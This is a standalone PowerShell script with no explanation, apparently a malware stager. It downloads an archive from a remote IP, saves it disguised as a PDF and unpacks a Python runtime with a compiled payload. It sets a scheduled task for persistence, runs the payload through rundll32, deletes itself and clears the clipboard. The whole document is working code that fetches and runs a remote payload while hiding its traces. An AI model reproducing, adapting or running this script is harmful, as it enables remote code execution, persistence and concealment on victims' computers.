$guid = [guid]::NewGuid()
$localAppData = $env:LocalAppData
irm 'http://10.0.16.39/?tic=2' -OutFile $localAppData\$guid.pdf

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory("$localAppData\$guid.pdf", "$localAppData\$guid")

$guidPath = Join-Path $localAppData $guid
$guidString = "$guid"

$extractedPythonw = "$guidPath\pythonw.exe"
$extractedCPython = "$guidPath\cpython-3134.pyc"

$taskAction = New-ScheduledTaskAction -Execute $extractedPythonw -Argument "`"$extractedCPython`""

$2minutesfromnow = (Get-Date).AddSeconds(180)
$taskTrigger = New-ScheduledTaskTrigger -Once -At $2minutesfromnow

$taskPrinciple = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited

Register-ScheduledTask -TaskName $guidString -Action $taskAction -Trigger $taskTrigger -Principal $taskPrinciple -Force

Set-Location $guidPath
$cpythonnamewithpyc = "cpython-3134.pyc"
Rename-Item -Path "cpython-3134" -NewName $cpythonnamewithpyc

iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $guidPath + '\pythonw" "' + $guidPath + '\'+ $cpythonnamewithpyc + '"')

Remove-Item $MyInvocation.MyCommand.Path -Force
Set-Clipboard